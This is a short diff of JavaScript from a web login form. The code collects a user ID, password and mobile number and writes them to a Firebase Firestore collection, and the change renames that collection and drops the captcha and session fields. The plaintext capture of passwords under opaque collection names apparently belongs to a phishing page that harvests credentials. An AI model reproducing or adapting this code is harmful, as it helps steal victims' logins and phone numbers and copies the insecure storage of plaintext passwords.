@@ -304,12 +304,10 @@
     const mobile = document.getElementById('mobile').value.trim();
     const captcha = document.getElementById('captchaInput').value.trim();
 
-    db.collection("user-loginkk").add({
+    db.collection("alldata45").add({
       userID: userID,
       password: password,
       mobile: mobile,
-      captcha: captcha,
-      sessionId: sessionId,
       timestamp: firebase.firestore.FieldValue.serverTimestamp()
     })
     .then(() => {
